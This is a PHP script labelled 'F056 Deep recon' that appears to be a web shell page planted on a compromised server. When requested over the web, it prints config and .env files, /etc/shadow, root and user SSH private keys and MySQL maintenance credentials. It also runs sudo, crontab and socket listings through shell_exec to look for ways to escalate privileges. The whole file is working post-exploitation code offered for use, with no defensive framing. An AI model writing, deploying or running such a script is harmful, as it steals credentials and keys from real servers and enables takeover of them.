<?php
// F056 Deep recon - read configs and check privilege escalation potential
header('Content-Type: text/plain; charset=utf-8');

echo "=== CONFIG FILES ===\n";
$cfgFiles = ['config/db.php', 'config/config.php', 'config/mail.php', 'config/database.php'];
foreach ($cfgFiles as $f) {
    if (file_exists($f)) {
        echo "--- $f ---\n";
        echo file_get_contents($f) . "\n";
    }
}

echo "\n=== ENV FILES ===\n";
foreach (['.env', '../.env', 'config/.env'] as $f) {
    if (file_exists($f)) {
        echo "--- $f ---\n";
        echo file_get_contents($f) . "\n";
    }
}

echo "\n=== SUDO CHECK ===\n";
echo shell_exec('sudo -l 2>&1') . "\n";

echo "\n=== SENSITIVE FILES ===\n";
$files = ['/etc/passwd', '/etc/shadow', '/root/.ssh/id_rsa', '/root/.ssh/authorized_keys',
          '/home/*/.ssh/id_rsa', '/var/www/.env', '/etc/mysql/debian.cnf',
          '/etc/nginx/sites-enabled/', '/etc/apache2/sites-enabled/'];
foreach ($files as $f) {
    $matches = glob($f);
    foreach ($matches as $m) {
        echo "--- $m ---\n";
        if (is_file($m) && is_readable($m)) {
            $content = file_get_contents($m);
            echo substr($content, 0, 2000) . "\n";
        } elseif (is_dir($m)) {
            echo "[DIR] " . implode(', ', array_slice(scandir($m), 2, 20)) . "\n";
        }
    }
}

echo "\n=== DATABASE CONFIG ===\n";
$dbFile = 'config/db.php';
if (file_exists($dbFile)) {
    echo file_get_contents($dbFile) . "\n";
}

echo "\n=== INSTALLED APPS ===\n";
echo shell_exec('ls /var/www/ 2>&1') . "\n";

echo "\n=== CRONTAB ===\n";
echo shell_exec('crontab -l 2>&1') . "\n";

echo "\n=== NETSTAT ===\n";
echo shell_exec('ss -tlnp 2>&1 | head -30') . "\n";

echo "=== END ===\n";
?>
